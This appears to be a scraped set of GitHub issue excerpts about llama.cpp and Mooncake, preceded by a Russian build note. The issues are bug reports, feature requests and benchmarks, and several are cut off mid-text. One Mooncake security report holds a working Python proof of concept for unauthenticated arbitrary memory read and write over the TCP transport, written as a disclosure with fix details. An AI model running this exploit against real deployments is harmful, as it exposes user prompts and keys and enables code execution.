**3. Сборка проекта `llama.cpp`**

*   **Конфигурация CMake:**
    *   Используйте CMake для генерации проекта сборки.
    *   Для включения поддержки CUDA используйте опцию `-DGGML_CUDA=ON` (устаревшая `LLAMA_CUBLAS=ON` больше не поддерживается).
    *   Пример команды для Visual Studio 2022:
        ```bash
        cmake .. -G "Visual Studio 17 2022" -A x64 -DGGML_CUDA=ON -DLLAMA_CURL=OFF -DLLAMA_BUILD_COMMON=ON -DLLAMA_BUILD_EXAMPLES=ON
        ```
*   **Сборка библиотек:**
    *   При включении `GGML_CUDA=ON` и `BUILD_SHARED_LIBS=ON` (по умолчанию для MSVC):
        *   Исходники CUDA (`ggml/src/ggml-cuda/*`) добавляются в сборку основной библиотеки `ggml`.
        *   Создаются файлы `bin/Debug|Release/ggml.dll` (содержит и CPU, и CUDA код) и `bin/Debug|Release/ggml.lib` (библиотека импорта для этой DLL).
    *   Основная библиотека `llama.lib` зависит от `ggml.lib`. Линковка с `llama.lib` предоставляет доступ ко всей функциональности, включая CU

items.title: Eval bug: llama-server returns logprob 0.0 (p=1.0) for every token when speculative decoding is enabled
items.author: jvdneste
items.body_excerpt:
### Name and Version

```
$ llama-server --version
version: 0.2.0-dev (build 10566, commit bb4caa7540)
built with GNU 16.2.1 for Linux x86_64
```

`master` is 120 commits ahead of `bb4caa7540` as I write this. No commit in that range
touches `tools/server/`, and the `common/speculative.cpp` changes in it are DFlash2 /
DSpark / draft-mtp-with-embeddings / benchmark-only options — none touch probability
output. The two code paths quoted below are byte-identical on master
(`3173a56471c1753650cd806694145ffd6dcace67`), so this should still reproduce, but I have
not rebuilt to confirm and am not claiming otherwise.

### Operating systems

Linux

### GGML backends

Vulkan

### Hardware

`Vulkan0: Intel(R) Arc(tm) B390 (PTL) (47829 MiB)` — integrated, unified memory.

### Models

**Target:** `google/gemma-4-26B-A4B-it-qat-q4_0-gguf` — Google's own QAT q4_0 GGUF,
unmodified. Verified byte-identical to the published file
(`sha256 3eca3b8f6d7baf218a7dd6bba5fb59a56ee25fe2d567b6f5f589b4f697eca51d`).

**Drafter:** `unsloth/gemma-4-26B-A4B-it-GGUF/MTP/mtp-gemma-4-26B-A4B-it-Q8_0.gguf`,
`--spec-type draft-mtp`. Google publishes the drafter only as safetensors
(`google/gemma-4-26B-A4B-it-assistant`, plus a QAT-matched
`google/gemma-4-26B-A4B-it-qat-q4_0-unquantized-assistant`); neither of their GGUF repos
ships a drafter, so any GGUF drafter is necessarily a third-party conversion. Acceptance
was healthy in the repro below (`draft_n_accepted=14` of `draft_n=24`), i.e. the drafter
is working normally.

The model pairing is incidental. The affected code is the generic speculative accept
path in `tools/server/server-context.cpp`; it runs after verification and never inspects
weights, tensor layout, or spec type, so every `--spec-type` and every target/drafter
pair should be affected. The A/B below is the same binary and the same request with only
the two drafter flags removed.

### Problem description & steps to reproduce

With speculative decoding enabled, `llama-server` returns `logprob: 0.0` (i.e. p = 1.0)
for **every** generated token, and an empty `top_logprobs` array. The values are
**silently wrong rather than absent** — the fields are present and well-formed.

Start the server with a drafter:

```
llama-server -m gemma-4-26B_q4_0-it-QAT.gguf \
  --spec-draft-model mtp-gemma-4-26B-A4B-it-Q8_0.gguf --spec-type draft-mtp \
  -ngl 999 --ctx-size 8192 -np 1 --cont-batching --jinja
```

then ask for logprobs:

```
curl -s http://127.0.0.1:8080/v1/chat/completions -H 'Content-Type: application/json' -d '{
  "model":"local",
  "messages":[{"role":"user","content":"Explain how a CPU branch predictor works."}],
  "max_tokens":24, "temperature":1.0, "logprobs":true, "top_logprobs":3}'
```

**With `--spec-draft-model` / `--spec-type draft-mtp` (23 of 24 tokens are exactly 0.0):**

```
'<|channel>'  logprob=-1.4305124977909145e-06  top_logprobs=[('<|channel>', -1.43e-06), ('thought', -14.67), ('s', -15.75)]
'thought'     logprob=0.0                      top_logprobs=[]
'\n\n'        logprob=0.0                      top_logprobs=[]
'*'           logprob=0.0                      top_logprobs=[]
'   '         logprob=0.0                      top_logprobs=[]
'*'           logprob=0.0                      top_logprobs=[]
'Target'      logprob=0.0                      top_logprobs=[]
':*'          logprob=0.0                      top_logprobs=[]
timings: predicted_n=24  draft_n=24  draft_n_accepted=14
```

**Same server, same request, drafter flags removed (0 of 24 are 0.0):**

```
'<|channel>'  logprob=-1.4305124977909145e-06   3 top_logprobs
'thought'     logprob=-7.271793037944008e-06    3 top_logprobs
'\n'          logprob=-0.7207118272781372       3 top_logprobs
'CPU'         logprob=-0.0010869447141885757    3 top_logprobs
' Branch'     logprob=-0.001078710425645113     3 top_logprobs
' Predict'    logprob=-0.000901389925274998     3 top_logprobs
'or'          logprob=-0.003622648539021611     3 top_logprobs
'.'           logprob=-0.06013880670070648      3 top_logprobs
```

Only the very first token is correct in the drafted arm, and only because it is sampled
before any draft exists, so it goes through the ordinary path.

### Cause

`populate_token_probs()` is the only writer of a real `result.prob`. The
non-speculative path sets a placeholder and then overwrites it
([server-context.cpp#L3849-L3856](https://github.com/ggml-org/llama.cpp/blob/3173a56471c1753650cd806694145ffd6dcace67/tools/server/server-context.cpp#L3849-L3856)):

```cpp
result.prob = 1.0f; // TODO: set it here instead of doing inside populate_token_probs

if (slot.task->params.sampling.n_probs > 0) {
    populate_token_probs(slot, result, slot.task->params.post_sampling_probs, params_base.special, tok_idx);
}
```

The speculative "main model sample and accept" path sets the same placeholder and never
calls it
([server-context.cpp#L3974-L3980](https://github.com/ggml-org/llama.cpp/blob/3173a56471c1753650cd806694145ffd6dcace67/tools/server/server-context.cpp#L3974-L3980)):

```cpp
result.prob = 1.0f; // set later

// TODO: set result.probs
```

So the placeholder is what gets serialised: `logprob = log(1.0) = 0`, and
`result.probs` stays empty, hence `top_logprobs: []`. This affects every token in the
accepted run, including the final target-sampled one — not only accepted draft tokens.

`git blame` puts `// TODO: set result.probs` at or before ab49f094d (the Nov 2025 move of
server-context into its own file), so it predates that refactor.

### Why this seems worth fixing rather than documenting

Absent logprobs are detectable by a caller; wrong ones are not. Anything that scores,
gates, or compares on logprobs — KLD/perplexity harnesses, confidence thresholds,
self-consistency ranking, quantisation comparisons — reads p = 1.0 and concludes the
model is maximally confident.

For a concrete case: I was testing whether `draft-mtp` biases the sampled distribution.
Mean logprob over 200 samples x 128 tokens came back **-0.00107 with MTP** against
**-

items.title: Feature Request: BPOSIT8 tensor type for exact, order-independent accumulation
items.author: rybruscoe
items.body_excerpt:
### Prerequisites

- [x] I am running the latest code. Mention the version if possible as well.
- [x] I carefully followed the [README.md](https://github.com/ggml-org/llama.cpp/blob/master/README.md).
- [x] I searched using keywords relevant to my issue to make sure that I am creating a new issue that is not already open (or closed).
- [x] I reviewed the [Discussions](https://github.com/ggml-org/llama.cpp/discussions), and have a new and useful enhancement to share.

### Feature Description

I want llama.cpp to support BPOSIT8:
- A new tensor type, GGML_TYPE_BPOSIT8, plus the matching file type for llama-quantize.
- Block of 32 weights: one signed 8-bit power-of-two scale and 32 b-posit8 codes, 33 bytes, 8.25 bits per weight.
- The dot product accumulates every product exactly in a 256-bit fixed-point quire and rounds once at the end, so the result is the same regardless of summation order, SIMD width, thread count or backend.
- Weights and activations both in this format (W8A8), CPU kernels first.

### Motivation

- Today the same GGUF gives different bits on different machines, thread counts and batch sizes because float accumulation is order-dependent. That blocks anything that needs a reproducible or auditable output: regulated deployments, evaluation harnesses, agents whose actions must be traceable, and independent verification of a served answer.
- With this type, one GGUF produces identical matmul outputs on x86 and ARM (and CUDA in our fork), and a served answer can be re-executed by an independent implementation and compared bit for bit. Two such implementations exist outside ggml (Python and Go, in the INVAR repo).
- Honest trade: it is about 3x slower than Q8_0 on CPU at small sizes and the same size class; it is a reproducible format, not a faster one.
- Six models in this format are already on Hugging Face under Anomly; huggingface/huggingface.js#2451 adds the label.

### Possible Implementation

- Refer to draft PR #28468 which I will keep in draft until the discussion here settles.
- Type ids 43 and 42 are the next free after Q2_0; I'm happy to renumber.
- Could split: type, block struct and reference quantizer first; CPU vec_dot second; CUDA (exists in github.com/anomly-labs/llama-cpp-et) later as its own PR.
- Tests in the PR: dispatch check, 64 golden dot vectors from an independent rational-arithmetic reference (64 of 64), 32 block permutations bit-identical (32 of 32), test-quantize-fns passes; llama-quantize on the branch reproduces the published SmolLM2-135M file byte for byte.
- Spec: github.com/anomly-labs/invar/blob/main/docs/EXACT-PROFILE-SPEC.md

items.title: Eval bug: Segmentation fault if a tool named "call" is called on llama-server
items.author: rafacarrascosa
items.body_excerpt:
### Name and Version

bin/llama-cli --version
version: 0.5.0-dev (build 11376, commit a55e952b8)
built with GNU 13.3.0 for Linux x86_64

### Operating systems

Linux

### GGML backends

CPU

### Hardware

i9-14900K

### Models

bartowski/Llama-3.2-1B-Instruct-GGUF:Q4_0

### Problem description & steps to reproduce

When llama-server tries to use a tool named "call" a segment fault happens.

I believe this happens because the grammar used to force structured output builds its rules using unescaped request text, and so ends up building a grammar rule named "tool-call" = "tool-" + "call", which is the same name the chat handler already uses for its own internal rule.
I believe this causes a self-reference is in the grammar which then produces the segmentation fault.

"call" is a valid OpenAI function name (name = [a-zA-Z0-9_-], <= 64 chars), so this is normal input, not a
malformed request, and since llama-server claims OpenAI API compatibility I believe we should support it.

Repro script
```bash
#!/usr/bin/env bash
# usage: repro.sh path/to/llama-server
SERVER=$1
if [ ! -f "$SERVER" ] || [ ! -x "$SERVER" ] || [ "$(basename "$SERVER")" != llama-server ]; then
    echo "usage: $0 path/to/llama-server" >&2; exit 1
fi
PORT=18207;
URL=http://127.0.0.1:$PORT

# Start server, wait until ready; Note: Downloads a small model (~0.8 GB) on first run.
"$SERVER" -hf bartowski/Llama-3.2-1B-Instruct-GGUF:Q4_0 -dev none --jinja -fit off --port $PORT >/dev/null 2>&1 &
PID=$!; trap 'kill $PID 2>/dev/null' EXIT
until curl -s $URL/health | grep -q ok; do kill -0 $PID 2>/dev/null || exit 1; sleep 1; done

ask() {
    curl -s $URL/v1/chat/completions -d '{
      "messages":[{"role":"user","content":"Call Alice."}],
      "tools":[{"type":"function","function":{"name":"'"$1"'","description":"Start a phone call with a contact",
        "parameters":{"type":"object","properties":{"contact":{"type":"string"}},"required":["contact"]}}}],
      "temperature":0,"max_tokens":128}'
}

ask phone; echo -e "\n"    # normal tool name
ask call;  echo -e "\n"    # collides with the internal tool-call rule -> crash
```

Related issues/PR:
 - #28429 Looks like the same root cause (rule name derived from tool/param name, then silently
overwritten)
 - #28483 Patches the same spot, but fixes it by rejecting the request instead, which I believe is the wrong behaviour in this case.

Some hints on a possible fix:
 - On a name clash, keep the tool's rule and give the wrapper a different name (append a number until it is free).
 - Use escaped request text (example: add a reserved prefix) for rule building (instead of raw).

Disclaimer: I used AI to help me find and understand this bug.

### First Bad Commit

_No response_

### Relevant log output

<details>
<summary>Logs</summary>
<!-- Copy-pasted short logs go into the "console" area here -->

```console
bash repro.sh bin/llama-server 
{"choices":[{"finish_reason":"tool_calls","index":0,"message":{"role":"assistant","content":"","tool_calls":[{"type":"function","function":{"name":"phone","arguments":"{\"contact\": \"Alice\"}"},"id":"1DYKSYtccONclbk8YvFWvSFdr98EDVMI"}]}}],"created":1791134985,"model":"bartowski/Llama-3.2-1B-Instruct-GGUF:Q4_0","system_fingerprint":"b11376-a55e952b8","object":"chat.completion","usage":{"completion_tokens":17,"prompt_tokens":176,"total_tokens":193,"prompt_tokens_details":{"cached_tokens":0}},"id":"chatcmpl-JmWg3X8Fej3riruYw4cD3PAeGDFlhBEE","timings":{"cache_n":0,"prompt_n":176,"prompt_ms":997.579,"prompt_per_token_ms":5.6680625,"prompt_per_second":176.42713008192837,"predicted_n":17,"predicted_ms":352.949,"predicted_per_token_ms":22.0593125,"predicted_per_second":45.332328466718984}}

items.title: Qwen3.8-Flash-Next on 6x3090 and 6x4090 without NVLink: prefill flat to 250k and faster, decode 2-10x vs upstream at depth, binaries and a reproducible grid
items.author: lukolszewski
items.body_excerpt: I have been running Qwen3.8-Flash-Next (qwen4exp) on six RTX 3090s behind consumer PCIe (4 of them hanging off USB4 eGPU docks), five simultaneus sessions of up to 262k each, since September and fixing what made it slow. I've been very pleasantly surprised with the great speed increase with long contexts and multiple session use. The patches sit on top of upstream df03399b8 and are published with binaries and container images here: https://github.com/lukolszewski/llama.cpp-multigpu It is still llama.cpp: same GGUF files, same llama-server API and flags, one build, every patch selected at runtime by an env var or a server flag. CUDA only. Upstream's rate falls with context and collapses when several sessions decode at once; the patched build stays roughly flat. Same model (unsloth UD-Q4_K_XL), same command line on both sides, 5 slots x 262k, q8_0 KV, layer split over six GPUs. Upstream is df03399b8 built with the same recipe. Tokens/s, 5-session rows per session (more info in the README): | workload | ctx | 6 x RTX 3090 (mine, PCIe x8/x4/x2) | 6 x RTX 4090 (rented, PCIe) | | --- | --- | ---: | ---: | | prefill, 1 session | 50k | 568 -> 2127 (3.7x) | 1728 -> 7050 (4.1x) | | prefill, 1 session | 250k | 263 -> 2111 (8.0x) | 744 -> 7403 (10.0x) | | prefill, 5 sessions, aggregate | 250k | 265 -> 2060 (7.8x) | not run -> 7241 | | generation, 1 session | 50k | 25.7 -> 41.9 (1.6x) | 46.2 -> 57.5 (1.2x) | | generation, 1 session | 250k | 10.2 -> 33.7 (3.3x) | 21.0 -> 48.7 (2.3x) | | generation, 5 sessions, per session | 250k | 2.3 -> 27.3 (10.8x) | not run -> 30.8 | At 5k with one session there is nothing to gain (1.0x on the 4090s). The 10.8x is a 2.3 t/s baseline, so the shape of the curves is the claim, not the ratio at the far end. Full 20-row grids, hardware records, raw JSON and server logs are in the README and benches/. Binaries support Tesla V100 and RTX2000 (as well as all the modern archs including RTX5090) as I'm plannign to test it on v100 (sadly I couldn't rent a working one today) and modded RTX2080 ti 22GB - If I can get my hands on a mashine with 6-8 of those. It is fun to be able to get very usable results from relatively budget over half decade old hardware, but the same code still provides benefits on newer GPUs. To run it, take the release tarball (cuda-12.9: V100 to RTX 5090 on any R525+ driver; cuda-13.4: Ampere+) or the server image, and use the command line from README section 5. With one GPU no switches are needed(although I'm targetting multigpu). To reproduce the grid on your own box the bench image runs both sides, downloads the model and the upstream baseline itself, and writes the JSON the tables are generated from; one docker command, also in the README. If you run it on a 5090 or PRO 6000 box I would like the JSON and hardware.md back. Two separate problems are fixed. The first is the decode slowdown with context depth from #28734: block-granular indexer top-k with a persistent pooled-key cache, and a compact-gather attention path so q8_0 KV keeps the sparse speedup. That part is built in, has no switch, and is what helps single-GPU users. The second is layer split over PCIe without NVLink: several sequences decoding without the GPUs waiting on each other, pipeline-parallel prefill, prefilling one slot while others decode, async prompt-cache transfers, and n-gram lookup speculation that works with all of that. Each change is one commit, listed with its switch in docs/multigpu/patches.md, and the series is attached to the release as format-patch output. Caveats: one model family, CUDA only, written for slow PCIe, so NVLink or single-GPU systems may not benefit and some patches could regress them if turned on. Mixed prefill plus decode is better than upstream but still the weak spot. Only sm_86 runs every day; the 4090 rows are from one rental. The code was written with an LLM and validated by measurement and output checks, not by review, so I will not open PRs from it myself; anyone is welcome to pick up any piece. The repo exists to be archived once upstream catches up. Upstream has meanwhile reworked the indexer; my 2026-10-03 port onto master is in #28734 and was slower on this hardware. I tried the MTP and it didn't help, slowed me down in most cases, so no MTP support in this branch, but n-gram speculation does 2.5x specifically code refactor for single user. I added an option to automatically disable it beyond 2 active decodes so we get the benefit without the downside, but our benchmarking did not not enable it to measure throughput without speculation. Thanks to @svgop, @wussh, @goodbadwolf and @albertnsoliz for reproducing and analysing the depth decay on a 5090, an A100 slice and a PRO 6000 in #28734.

items.title: qwen4exp (Qwen3.8-Flash-Next): stochastic tool-call emission returned as content (finish=stop) + nlohmann 302 mid-stream - silent tool-call drops
items.author: simms21
items.body_excerpt:
### Name and Version

llama-server built from tag v0.6.0 (`.devops/cuda.Dockerfile`, target server), CUDA.

### Operating systems

Linux (Docker, ubuntu base)

### GGML backends

CUDA (+ CPU variant), GGML_BACKEND_DL=ON, GGML_CPU_ALL_VARIANTS=ON

### Model

Qwen3.8-Flash-Next (Qwen4ExpForConditionalGeneration), custom GSQ-RCO-quantized GGUF of the public checkpoint.

### Problem description & steps to reproduce

With llama-server launched with `--jinja` (native tool calling) and tools registered with `tool_choice: auto`, the model emits **well-formed `<tool_call>` blocks as plain content** — llama.cpp returns them as an ordinary assistant message with `finish_reason: stop` instead of parsing them (`finish_reason: tool_calls`). The client never executes the tool; the conversation silently ends mid-task.

- Two emission variants leak: the XML function-tag form `<tool_call><function=name><parameter=k>v</parameter>...</function></tool_call>` and the JSON-arguments form `<tool_call>{"name": ..., "arguments": {...}}</tool_call>`.
- **Stochastic**: identical prompts succeed and fail across consecutive runs (~30-50% failure over a 15-chat window). Fresh short contexts fail too — not a long-context effect.
- Works-then-fails within a single reply: the first native tool call executes, the model continues, and its *second* emission leaks.

Server-side signature — llama.cpp's completion handler catches a nlohmann exception and returns 400 mid-stream (log evidence):

```
got exception: {"error":{"code":400,"message":"[json.exception.type_error.302] type must be string, but is object","type":"invalid_request_error"}}
```

Client-side: assistant content contains the literal well-formed `<tool_call>` block; no `finish_reason: tool_calls`.

### Root-cause pointer

In `common_chat_peg_parse` (common/chat.cpp), the auto-derived PEG grammar for this architecture parses the emission **successfully** but the mapper assigns the `<tool_call>` block to `msg.content` instead of `msg.tool_calls`. The emission itself is well-formed: parsing the block tolerantly (JSON-arguments and XML function-tag variants) yields valid name/arguments.

Suggested fix: a post-mapping fallback that lifts well-formed `<tool_call>` blocks found in `msg.content` into `msg.tool_calls` when the strict grammar produced none. We have a working patch (verified: previously-failing emissions execute correctly after it) and can open a PR.

### Not specific to one deployment

Reproduced across: two independent builds (v0.6.0 tag and a source-patched build), context sizes 131072 / 262144, `--n-cpu-moe` 16 / 18 / 28, with and without `--load-mode none`, and three custom quantizations of the same checkpoint — including on a short fresh 4-turn chat.

### Related

- #28805 (qwen4exp long-context stochastic EOS — same degradation family, different symptom)
- #27756 (Qwen3.5-hybrid DeltaNet depth degradation)
- #28734 (qwen4exp CUDA: decode slows linearly with context)

items.title: Feature Request: exact chunked training for long windows (chunk x window memory, gradient carried through the cached K/V and recurrent state)
items.author: joelteply
items.body_excerpt:
### What

Training on a long window builds explicit attention (flash attention has no backward), so the KQ matrix is window² × heads floats per layer. At 63k tokens on a 27B (24 heads) that's the allocation we measured: `cudaMalloc` asked for **388,718 MiB**. Recompute can't help, since it's one layer's working set. So `llama_opt_epoch` can't train a long window on any single GPU, however the rest of the memory is managed.

### What our fork does (take it or leave it): an exact chunked walk

The window is decoded once into the KV cache, then trained in **reverse**, one chunk at a time:
- Each chunk's graph attends to the cached prefix. The last H prefix positions sit behind a zero "gradient leaf" (`GGML_TENSOR_FLAG_GRAD`: a leaf whose gradient the backward computes and no optimizer updates), so the backward yields dL/d(cached K/V) without copying the cache.
- The chunk's own K/V meet the gradient later chunks put on them through a surrogate term ⟨K, G⟩ + ⟨V, G⟩, so its backward carries that gradient into the adapter and into its own prefix.
- A recurrent model's state is carried the same way: the entry state is a gradient leaf, the exit state gets a surrogate, and host checkpoints at chunk boundaries are rebuilt by decoding forward.
- There is ONE optimizer step per window, which is also what keeps each chunk's recomputed K/V equal to the cached values.

Memory is chunk × window instead of window². The horizon H shrinks automatically to fit the device; the forward always sees the whole window.

### Measured

`tests/test-walk-exact.cpp`, comparing the SGD step read off the adapter (exactly −lr·g) against one graph over the whole window:

| model | exact walk (4 chunks) | per-chunk, stop-gradient |
|---|---|---|
| Qwen2.5-Coder-1.5B (attention) | cosine 0.998 | 0.81 |
| Qwen3.5-0.8B (hybrid) | cosine 0.998 | 0.83 |

It holds at F32, F16 and Q8_0 caches. End to end, eval loss is 0.283 → **0.215** (1.5B) and 0.284 → **0.245** (hybrid) against the per-chunk walk. It has run a 66,560-token window on a 27B hybrid on one RTX 5090, beside the same process serving it.

### Code

- The walk itself: https://github.com/CambrianTech/llama.cpp/pull/40
- The exact gradient on top of it: https://github.com/CambrianTech/llama.cpp/pull/47 (`GGML_TENSOR_FLAG_GRAD`; `ggml_opt_set_next_step` for a caller-driven period with a weighted loss and an extra term; parameter-keyed accumulators, since the chunk graphs vary in topology; the hybrid state carry; host budget and checkpointing)
- A fix found under production params: https://github.com/CambrianTech/llama.cpp/pull/48

It's large and opinionated, so it's offered as a design with working code and measurements, not as a PR. Happy to answer questions.

items.title: [RFC]: End-to-End Transfer Tracing for Mooncake
items.author: llfl
items.body_excerpt:
### Changes proposed

## Summary

  This RFC proposes a unified tracing architecture for Mooncake transfer execution.

  The design introduces a reusable tracing subsystem and applies it across the transfer path so a single
  logical transfer can be observed across:

  - store-facing orchestration
  - transfer-engine batch management
  - multi-transport task submission
  - per-slice data-plane execution
  - terminal completion / failure / timeout reporting

  The result is a structurally consistent trace tree that supports both live debugging and offline postmortem
  analysis.

  ---

  ## Motivation

  Mooncake transfer workflows cross several layers, but observability has historically been fragmented. Logs
  and metrics can show symptoms, but they do not preserve causality.

  This creates recurring problems:

  - latency attribution is ambiguous
  - control-plane and data-plane delays are hard to separate
  - timeout root cause is difficult to localize
  - store-level operations and transfer-engine execution are not naturally correlated
  - external systems cannot reliably ingest or reconstruct transfer timelines

  We need tracing that preserves parent-child relationships across the full transfer lifecycle, not just
  isolated spans emitted by individual modules.

  ---

  ## Goals

  - Provide a common tracing substrate for Mooncake components
  - Preserve trace continuity across store, transfer engine, and transport layers
  - Model transfer execution with stable, explicit span hierarchy
  - Export traces to local files and OTLP collectors
  - Support async export with retry and spool behavior
  - Improve trace completeness for failure and timeout cases
  - Make offline investigation possible from raw JSONL outputs

  ## Non-goals

  - Redesign transfer scheduling or transport selection
  - Replace existing metrics or logs
  - Guarantee zero-overhead tracing on hot paths
  - Fully redesign all observability ownership boundaries in one patch
  - Solve every TENT-specific tracing gap in this RFC

  ---

  ## Background

  A Mooncake transfer is not a single function call. It is a lifecycle:

  1. a store-side operation decides how to move data
  2. transfer-engine allocates and manages a batch
  3. multi-transport selects concrete transports
  4. transports submit slice-level work
  5. status polling eventually determines terminal state

  Without explicit trace propagation, each stage can emit useful local signals while the global story remains
  invisible.

  The core design principle of this RFC is:

  **Make the lifecycle first-class.**
  Do not infer it from logs after the fact.

  ---

  ## Proposal

  ### 1. Introduce `mooncake-tracing`

  Add a dedicated tracing module that provides:

  - `TraceContext`
  - `TraceCarrier`
  - `TraceRecord`
  - `TracingFacade`
  - RAII-style `Span`
  - configurable sampling
  - pluggable exporters

  This module becomes the single place where trace creation, parenting, export, and sampling behavior live.

  ### 2. Define a stable transfer span hierarchy

  The proposed hierarchy is:

  - `mooncake.transfer.operation`
    - `mooncake.transfer.submit_gap`
    - `te.batch`
      - `te.batch.submit`
        - `te.task.submit`
          - slice events
      - `te.batch.execute`
      - `te.task.status`
      - `te.batch.status`
    - `mooncake.transfer.wait_completion`
    - `mooncake.transfer.complete`

  This hierarchy captures both:
  - the user-visible transfer operation lifecycle
  - the internal execution lifecycle inside the transfer engine

  ### 3. Support parent context propagation

  When an upstream trace context exists, Mooncake should attach to it.
  When no parent exists, Mooncake should create its own operation root.

  This allows Mooncake transfers to participate in larger distributed traces while still remaining self-
  contained when invoked directly.

  ### 4. Keep batch-level tracing alive until terminal state

  A short-lived submit-only span is insufficient because a transfer can spend most of its time after
  submission.

  The batch root span must survive until terminal completion, failure, cancellation, or timeout.
  A separate persistent execution span (`te.batch.execute`) captures the data-plane lifetime.

  ### 5. Add explicit task and slice tracing state

  `MultiTransport` maintains trace registry state for:

  - batch context
  - task context
  - transport name
  - slice queue state
  - slice terminal state
  - deduplicated terminal markers

  This avoids duplicate terminal events and lets status polling produce complete traces even when terminal
  evidence appears asynchronously.

  ### 6. Export traces through configurable backends

  Supported paths include:

  - in-memory exporter for tests
  - JSONL exporter for local/debug workflows
  - OTLP/HTTP exporter for collector integration
  - async remote exporter with:
    - queue limits
    - retry
    - local spool fallback

  ### 7. Provide offline trace aggregation

  An offline aggregator script merges JSONL outputs into a readable waterfall / phase report for postmortem
  analysis.

  This is especially useful when traces were produced locally or remote collection was unavailable.

  ---

  ## Detailed Design

  ### Store-side tracing

  Store transfer flows create a `TransferTraceSession` that:

  - creates a standalone root span if no parent exists
  - reuses the provided parent context when one exists
  - tracks submit-gap timing
  - creates a wait-completion span
  - records final completion status

  This ensures the store layer has a coherent operation-level narrative.

  ### Transfer-engine tracing

  `TransferEngineImpl` owns batch-lifecycle tracing semantics.

  It maintains active batch trace state and ensures:

  - one stable `te.batch` root per batch
  - one stable `te.batch.execute` span for data-plane lifetime
  - child operation spans for submit / notify / status actions
  - terminal closure at batch completion or release

  ### Multi-transport t

items.title: [Bug]: Unauthenticated arbitrary memory read and write in Mooncake TCP transport data plane
items.author: yyymk
items.body_excerpt:
### Bug Report

### Summary

The TCP transport of mooncake-transfer-engine serves a raw memory access protocol on its data port without any authentication or address validation. Any host that can reach the port can read and write arbitrary memory of the engine process, including memory outside any registered buffer. Runtime-confirmed on mooncake-transfer-engine 0.3.11.post1. The fix in 0.3.13 (commit `a2933849417259e562fc9cbad63c618d464dfb2d`) added address validation against registered buffers. Suggested severity: High, CVSS 8.8.

### Details

`TcpTransport::install` (src/transport/tcp_transport/tcp_transport.cpp) opens a data listener via `findAvailableTcpPort`, which picks a random port from the documented default range 15000-17000 (`GlobalConfig::rpc_min_port`/`rpc_max_port` in include/config.h) and binds on all interfaces.

The server side of the protocol is `ServerSession`. The wire header is a plain C struct, not packed, so it is 24 bytes on the wire:

```cpp
struct SessionHeader {
    uint64_t size;
    uint64_t addr;
    uint8_t opcode;
};
```

In `ServerSession::readHeader` the address field from the network is used directly as a local pointer:

```cpp
local_buffer_ = (char*)(le64toh(header_.addr));
if (header_.opcode == (uint8_t)TransferRequest::WRITE)
    readBody();
else
    writeBody();
```

`readBody` receives `size` bytes from the socket into `addr + total_transferred_bytes_`. `writeBody` sends `size` bytes of process memory starting at `addr` back to the peer. There is no peer authentication, `addr`/`size` are never checked against the local segment descriptor's registered buffers, `size` is unbounded, and the connection is persistent, so several requests can be pipelined over one connection.

0.3.13 wires a `validateTcpAddress` callback into the session and rejects addresses outside registered buffers in both directions. That confines the primitive to registered memory; the port still has no peer authentication.

### PoC

Environment: Linux x86_64, Python 3.11, `pip install mooncake-transfer-engine==0.3.11.post1`. Run both scripts on machines that can reach each other; use the victim host's real IP, not 127.0.0.1.

Victim (registers a canary buffer, also allocates a second buffer it never registers):

```python
# victim.py
import ctypes, time
from mooncake.engine import TransferEngine

HOST = "192.168.105.123"  # victim host IP

reg = ctypes.create_string_buffer(65536)
nonreg = ctypes.create_string_buffer(65536)
ctypes.memmove(reg, b"C4CANARY" + b"A" * 56, 64)
ctypes.memmove(nonreg, b"C4NONREG" + b"B" * 56, 64)

te = TransferEngine()
assert te.initialize(HOST, "P2PHANDSHAKE", "tcp", "") == 0
assert te.register_memory(ctypes.addressof(reg), 65536) == 0
print("reg_addr =", ctypes.addressof(reg), flush=True)
print("nonreg_addr =", ctypes.addressof(nonreg), flush=True)
print("rpc_port =", te.get_rpc_port(), flush=True)
time.sleep(3600)
```

Run it with `GLOG_logtostderr=1 MC_FORCE_TCP=1 python victim.py 2> victim.log`, then read the data port from the log line `TcpTransport: listen on port <N>`.

Attacker:

```python
# attacker.py
import socket, struct, time

HOST, DATA_PORT = "192.168.105.123", 16662
REG_ADDR = 0x5A89CC2E05A0        # reg_addr printed by victim
NONREG_ADDR = 0x5A89CC3E05A0     # nonreg_addr printed by victim

def hdr(size, addr, opcode):
    return struct.pack("<QQB", size, addr, opcode) + b"\x00" * 7  # 24 bytes, struct not packed

def read_mem(addr, size):
    s = socket.create_connection((HOST, DATA_PORT))
    s.sendall(hdr(size, addr, 0))
    out = b""
    while len(out) < size:
        chunk = s.recv(65536)
        if not chunk:
            break
        out += chunk
    s.close()
    return out

def write_mem(addr, data):
    s = socket.create_connection((HOST, DATA_PORT))
    s.sendall(hdr(len(data), addr, 1))
    s.sendall(data)
    time.sleep(1)
    s.close()

print(read_mem(REG_ADDR, 64))      # b'C4CANARY' + b'A'*56   -> arbitrary read, registered buffer
print(read_mem(NONREG_ADDR, 64))   # b'C4NONREG' + b'B'*56   -> read outside any registered buffer
write_mem(REG_ADDR, b"ATTACKER_BYTES" + b"C" * 51)
print(read_mem(REG_ADDR, 64))      # b'ATTACKER_BYTES'...    -> arbitrary write
write_mem(NONREG_ADDR, b"ATTACKER_BYTES" + b"D" * 51)        # write outside any registered buffer
```

Observed on 0.3.11.post1: both reads return the canaries byte for byte (RTT ~0.2 ms), both writes replace the buffer contents, and the victim process stays alive throughout. A control connection that connects and closes, and 100 bytes of garbage sent to the handshake RPC port, also leave the victim alive. A read or write against an unmapped address such as 0x10 does not kill the process: the kernel returns EFAULT to the socket call and the session aborts, so the demonstrated primitive is read/write of mapped memory, not a one-packet crash.

### Impact

This is a missing-authorization issue (CWE-306) on the engine data plane. The attacker needs no credentials, only network reachability to the TCP data port of an engine process. Deployments running the TCP transport (hosts without an RDMA NIC, or `MC_FORCE_TCP=1`) bind it on all interfaces by default; the port is trivially discoverable because it always falls in the documented 15000-17000 range.

Confidentiality: full process memory disclosure. In an sglang or vLLM deployment the hosting process is the scheduler/EngineCore, so the KV cache including user prompts and context, Python heap objects, keys and pointer chains can be dumped. Integrity: an attacker-controlled write anywhere in the process, including memory outside registered buffers, gives data corruption up to code execution in the engine process. Availability: overwriting mapped memory corrupts the hosting engine process. Suggested CVSS:3.1 vector AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H (8.8). Affected: mooncake-transfer-engine <= 0.3.12.post1; patched in 0.3.13.

### Before submitting...

- [x] Ensure you searched for relevant issues and read the [documentation]

items.title: [Bug]: Unauthenticated task assignment, queue theft, and fake completion in Mooncake Store Master
items.author: yyymk
items.body_excerpt:
### Bug Report

### Summary

